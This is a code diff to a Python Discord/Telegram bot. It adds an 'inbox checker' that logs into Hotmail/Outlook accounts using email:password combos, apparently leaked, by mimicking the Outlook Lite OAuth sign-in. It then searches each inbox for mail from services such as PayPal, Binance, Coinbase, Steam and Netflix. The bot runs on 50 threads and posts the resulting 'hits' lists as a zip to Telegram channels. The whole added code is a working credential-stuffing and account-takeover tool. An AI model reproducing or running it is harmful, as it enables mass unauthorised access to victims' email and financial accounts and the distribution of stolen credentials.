@@ -15,6 +15,9 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 import aiohttp
+import concurrent.futures
+import uuid
+import zipfile
 
 import discord
 from discord.ext import commands, tasks
@@ -30,6 +33,7 @@ TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
 OWNER_ID           = int(os.environ["OWNER_ID"])
 
 CHECK_INTERVAL   = 30
+CHECKER_THREADS  = 50
 MS_DOMAINS = {"hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotmail.it",
               "hotmail.es", "hotmail.nl", "hotmail.be", "hotmail.se", "hotmail.no",
               "hotmail.dk", "hotmail.fi", "hotmail.pt", "hotmail.com.ar", "hotmail.com.br",
@@ -185,6 +189,152 @@ async def extract_raw(page, url: str) -> str:
                 await asyncio.sleep(2)
 
     return ""
+
+
+# ─── INBOX CHECKER ───────────────────────────────────────────────────────────
+INBOX_SERVICES = {
+    "Facebook":     "security@facebookmail.com",
+    "Instagram":    "security@mail.instagram.com",
+    "TikTok":       "register@account.tiktok.com",
+    "Twitter":      "info@x.com",
+    "Netflix":      "info@account.netflix.com",
+    "Spotify":      "no-reply@spotify.com",
+    "PayPal":       "service@paypal.com.br",
+    "Binance":      "do-not-reply@ses.binance.com",
+    "Coinbase":     "no-reply@coinbase.com",
+    "Steam":        "noreply@steampowered.com",
+    "Xbox":         "xboxreps@engage.xbox.com",
+    "PlayStation":  "reply@txn-email.playstation.com",
+    "Epic Games":   "help@acct.epicgames.com",
+    "Amazon":       "auto-confirm@amazon.com",
+    "Discord":      "noreply@discord.com",
+    "Snapchat":     "no-reply@accounts.snapchat.com",
+    "Twitch":       "no-reply@twitch.tv",
+    "NordVPN":      "no-reply@nordvpn.com",
+    "Revolut":      "no-reply@revolut.com",
+    "Uber":         "no-reply@uber.com",
+}
+
+
+def check_inbox_account(combo: str) -> tuple:
+    """Login to hotmail and check inbox for service emails. Returns (combo, hits_dict)."""
+    import requests, re, uuid, time
+    try:
+        email, password = combo.split(":", 1)
+        session = requests.Session()
+
+        # Step 1 - verify MSAccount
+        r1 = session.get(
+            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
+            headers={
+                "X-OneAuth-AppName": "Outlook Lite",
+                "X-Office-Version": "3.11.0-minApi24",
+                "X-CorrelationId": str(uuid.uuid4()),
+                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+                "Host": "odc.officeapps.live.com",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip"
+            }, timeout=15)
+        if "MSAccount" not in r1.text:
+            return (combo, {})
+
+        time.sleep(0.3)
+
+        # Step 2 - get login page
+        r2 = session.get(
+            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+            allow_redirects=True, timeout=15)
+
+        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
+        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+        if not url_match or not ppft_match:
+            return (combo, {})
+
+        post_url = url_match.group(1).replace("\\/", "/")
+        ppft     = ppft_match.group(1)
+
+        # Step 3 - login
+        r3 = session.post(post_url,
+            data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960",
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Origin": "https://login.live.com",
+                "Referer": r2.url
+            }, allow_redirects=False, timeout=15)
+
+        if any(x in r3.text for x in ["account or password is incorrect", "Incorrect password", "Invalid credentials", "identity/confirm", "Abuse", "signedout", "locked"]):
+            return (combo, {})
+
+        location   = r3.headers.get("Location", "")
+        code_match = re.search(r'code=([^&]+)', location)
+        if not code_match:
+            return (combo, {})
+
+        # Step 4 - get access token
+        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+            data={
+                "client_info": "1",
+                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+                "grant_type": "authorization_code",
+                "code": code_match.group(1),
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
+            }, timeout=15)
+
+        if r4.status_code != 200 or "access_token" not in r4.text:
+            return (combo, {})
+
+        access_token = r4.json()["access_token"]
+        mspcid = next((c.value for c in session.cookies if c.name == "MSPCID"), str(uuid.uuid4()))
+        cid = mspcid.upper()
+
+        # Step 5 - search inbox for each service
+        hits = {}
+        for service_name, sender in INBOX_SERVICES.items():
+            try:
+                r = requests.post(
+                    "https://outlook.live.com/search/api/v2/query",
+                    json={"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC",
+                          "TextDecorations": "Off",
+                          "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
+                                              "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
+                                              "From": 0, "Query": {"QueryString": f"from:{sender}"},
+                                              "Size": 1, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]},
+                    headers={"Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"},
+                    timeout=10)
+                if r.status_code == 200:
+                    data = r.json()
+                    try:
+                        total = data["EntitySets"][0]["ResultSets"][0].get("Total", 0)
+                        if total > 0:
+                            hits[service_name] = total
+                    except Exception:
+                        pass
+                time.sleep(0.1)
+            except Exception:
+                continue
+
+        return (combo, hits)
+
+    except Exception:
+        return (combo, {})
+
+
+async def run_inbox_checker(combos: list) -> dict:
+    """Run inbox checker on all combos. Returns dict of service -> list of combos."""
+    log.info(f"Running inbox checker on {len(combos)} combos...")
+    loop = asyncio.get_event_loop()
+    service_map = {}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
+        futures = [loop.run_in_executor(pool, check_inbox_account, combo) for combo in combos]
+        results = await asyncio.gather(*futures)
+    for combo, hits in results:
+        for service in hits:
+            service_map.setdefault(service, []).append(combo)
+    log.info(f"Inbox check done — hits in {len(service_map)} service(s): {list(service_map.keys())}")
+    return service_map
 
 
 # ─── PASTED.PW ───────────────────────────────────────────────────────────────
@@ -435,6 +585,22 @@ async def monitor_loop():
                                 fname = f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt"
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
+
+                            # Run inbox checker and post inbox_hits.zip (hotmail only)
+                            if label == "hotmail":
+                                try:
+                                    service_map = await run_inbox_checker(all_raw)
+                                    if service_map:
+                                        zip_buf = io.BytesIO()
+                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                                            for service, combos in service_map.items():
+                                                zf.writestr(f"{service}.txt", "\n".join(combos))
+                                        zip_buf.seek(0)
+                                        zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
+                                        await send_telegram_file(zip_buf.read(), zip_name)
+                                        log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
+                                except Exception as e:
+                                    log.error(f"Inbox checker failed: {e}")
 
                             # Post sorted domains ZIP (hotmail only)
                             if label == "hotmail":
